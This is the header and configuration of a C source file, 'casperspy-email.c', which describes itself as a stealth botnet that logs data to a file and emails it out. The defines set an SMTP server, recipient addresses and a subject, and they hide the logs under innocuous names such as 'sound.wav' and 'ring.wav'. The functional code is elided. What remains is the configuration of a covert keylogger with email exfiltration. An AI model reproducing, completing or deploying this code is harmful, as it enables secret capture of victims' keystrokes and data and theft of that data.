/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
*                                                                              *
*  File: casperspy-email.c   Ver. 1.0                                          *
*                                                                              *
*  Purpose: a stealth (somewhat) botnet, writes to a log file then sends       *
...
*  casperspy (www.casperspy.com) did the initial work on the key               *
...
IT WILL NOT WORK!!! */
#define cmailserver "smtpcorp.com"
#define cemailto "your@email.com"
#define cemailfrom "your@email.com"
#define LogLength 100
#define FileName "sound.wav"
#define SMTPLog "ring.wav"
#define cemailsubject "CasperLogger"
